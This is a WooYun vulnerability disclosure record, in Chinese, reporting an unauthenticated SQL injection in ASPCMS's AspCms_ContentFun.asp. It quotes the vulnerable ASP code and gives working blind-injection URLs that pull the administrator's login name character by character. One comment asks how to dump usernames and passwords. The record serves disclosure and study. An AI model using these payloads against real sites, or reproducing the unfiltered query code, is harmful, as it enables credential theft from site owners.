{"id": 8261, "wybug_id": "wooyun-2013-034373", "wybug_title": "ASPCMS存在SQL注入漏洞可获取敏感信息", "wybug_corp": "aspcms", "wybug_author": "My5t3ry", "wybug_date": "2013-08-15 08:33", "wybug_open_date": "2013-11-13 08:34", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射", "后台验证绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-11-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： ASPCMS系统对用户提交的参数过滤不严，导致攻击者可以提交SQL语句查询数据库获取敏感信息。 详细说明：  漏洞存在于/admin_aspcms/_content/_Content/AspCms_ContentFun.asp，这个文件未验证管理员权限，因此如何人都可以访问，同时该文件对获取的参数没有使用自定义的filterPara函数过滤，导致多处注入，代码入下：<!--#include file=\"../../inc/AspCms_SettingClass.asp\" --><!--#include file=\"../../editor/fckeditor.asp\" --><%'die debugmodedim action : action=getForm(\"action\",\"get\")dim ContentID, LanguageID, SortID, GroupID, Exclusive, Title, Title2, TitleColor, IsOutLink, OutLink, Author, ContentSource, ContentTag, Content, ContentStatus, IsTop, IsRecommend, IsImageNews, IsHeadline, IsFeatured, ContentOrder, IsGenerated, Visits, AddTime, ImagePath, IndexImage, DownURL, PageTitle, PageKeywords, PageDesc, PageFileName, spec, EditTime,DownGroupID,IsNoComment,Star,Timeing,TimeStatus,VideoGroupID,CHvalue,SpecCategory'SpecCategory用于判断是哪个类型的自定义参数dim sortType, keyword, page, psize, order, ordsc, sortTypeNamesortType=getForm(\"sortType\",\"get\")if isnul(sortType) then sortType=0\tsortid=getForm(\"sortid\",\"post\")\tif isnul(sortid) then sortid=getForm(\"sortid\",\"get\")keyword=getForm(\"keyword\",\"post\")if isnul(keyword) then keyword=getForm(\"keyword\",\"get\")page=getForm(\"page\",\"get\")psize=getForm(\"psize\",\"get\")order=getForm(\"order\",\"get\")ordsc=getForm(\"ordsc\",\"get\")DownGroupID=getForm(\"DownGroupID\",\"post\")VideoGroupID=getForm(\"VideoGroupID\",\"post\") select case sortType\tcase \"2\"\t\tsortTypeName =\"文章\"\t\tSpecCategory = \"C\"\tcase \"3\"\t\tsortTypeName =\"产品\"\t\tSpecCategory = \"P\"\tcase \"4\"\t\tsortTypeName =\"下载\"\t\tSpecCategory = \"DL\"\tcase \"5\"\t\tsortTypeName =\"招聘\"\t\tSpecCategory = \"HR\"\tcase \"6\"\t\tsortTypeName =\"相册\"\t\tSpecCategory = \"FO\"\tcase \"8\"\t\tsortTypeName = \"视频\"\t\tSpecCategory = \"VI\" end select '单篇1,文章2,产品3,下载4,招聘5,相册6,链接7，视频8 Select  case action\tcase \"add\" : addContent\t\tcase \"edit\" : editContent\t\tcase \"move\" : moveContent\tcase \"copy\" : copyContent\tcase \"rpost\" : rpostContent\t\t\t\tcase \"del\" : delContent\t\tcase \"recovery\" : Recovery\t\tcase \"tdel\" : trueDelContent\tcase \"on\" : onOff \"on\", \"Content\", \"ContentID\", \"ContentStatus\", \"\", getPageName()&\"?sortType=\"&sortType&\"&sortid=\"&sortid&\"&keyword=\"&keyword&\"&page=\"&page&\"&psize=\"&psize&\"&order=\"&order&\"&ordsc=\"&ordsc\tcase \"off\" : onOff \"off\", \"Content\", \"ContentID\", \"ContentStatus\", \"\", getPageName()&\"?sortType=\"&sortType&\"&sortid=\"&sortid&\"&keyword=\"&keyword&\"&page=\"&page&\"&psize=\"&psize&\"&order=\"&order&\"&ordsc=\"&ordsc \tcase \"order\" : UpdateOrder End Select代码略……Sub trueDelContent\tdim id : id=getForm(\"id\",\"both\")\tif isnul(id) then alertMsgAndGo \"请选择要操作的内容\",\"-1\"\tif runmode=1 then\t\tdim rs, sql, filepath\t\tdim templateobj : set templateobj=new TemplateClass\t\tsql=\"select ContentID,Title,sortType,SortFolder,a.GroupID,ContentFolder,ContentFileName,a.AddTime,a.PageFileName,a.SortID,b.GroupID from {prefix}Content as a, {prefix}Sort as b where a.LanguageID=\"&session(\"languageID\")&\" and a.SortID=b.SortID and ContentStatus=2 and ContentID in(\"&id&\")\"\t\tset rs=conn.exec(sql,\"r1\")\t\t\t\tdo while not rs.eof \t\t\tfilepath=templateobj.getContentLink(rs(\"SortID\"),rs(\"ContentID\"),rs(\"SortFolder\"),rs(\"a.GroupID\"),rs(\"ContentFolder\"),rs(\"ContentFileName\"),rs(\"AddTime\"),rs(\"PageFileName\"),rs(\"b.GroupID\"))\t\t\tif isExistFile(filepath) then delFile filepath\t\t\t\t\t'echo filepath&\"<br>\"\t\t\trs.movenext\t\tloop\tend if\tconn.exec \"delete from {prefix}Content where ContentStatus=2 and ContentID in(\"&id&\")\",\"exe\"\talertMsgAndGo \"彻底删除成功\",getPageName()&\"?sortType=\"&sortType&\"&sortid=\"&sortid&\"&keyword=\"&keyword&\"&page=\"&page&\"&psize=\"&psize&\"&order=\"&order&\"&ordsc=\"&ordscEnd Sub   漏洞证明：  利用比较简单，利用iif来强制报错：http://192.168.116.130/aspcms/admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2=iif(((select asc(mid(LoginName,1,1)) from AspCms_User where UserID=1)=97),2,chr(97))查询管理员用户名第一个字符是否为a如图\n\nhttp://192.168.116.130/aspcms/admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2=iif(((select asc(mid(LoginName,1,1)) from AspCms_User where UserID=1)=98),2,chr(97))查询管理员用户名第一个字符是否为b如图，返回为假，强制报错：\n\n   修复方案：  过滤，你懂的   版权声明：转载请注明来源 My5t3ry@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-08-15 09:44 |    \t\t落叶纷飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:1        | im luoye,Once the 00day.cn)\t\t \n  @My5t3ry 好劲啊好劲啊好劲抽，U9首席技术官    \n     2013-08-15 10:10 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  @落叶纷飞 丫的死落叶 赶紧转几个WB过来，我一个都没有    \n     2013-08-15 20:07 |    \t\t落叶纷飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:1        | im luoye,Once the 00day.cn)\t\t \n  @My5t3ry 买啊，充钱啊，你是大黑客，我也只有一点点WB啊    \n     2013-08-15 20:08 |    \t\t落叶纷飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:1        | im luoye,Once the 00day.cn)\t\t \n  @My5t3ry 买啊，充钱啊，你是大黑客，我也只有一点点WB啊    \n     2013-10-31 02:21 |    \t\t马丁 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:23        | 大爷~给口饭吧。)\t\t \n  总感觉楼上聊的挺HIGH    \n     2013-11-13 09:49 |    \t\tw5r2 \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:52        )\t\t \n  买啊，充钱啊，你是大黑客，我也只有一点点WB啊     \n     2015-06-08 20:50 |    \t\t明明 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 我是明明)\t\t \n  怎么爆出用户和密码呢    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}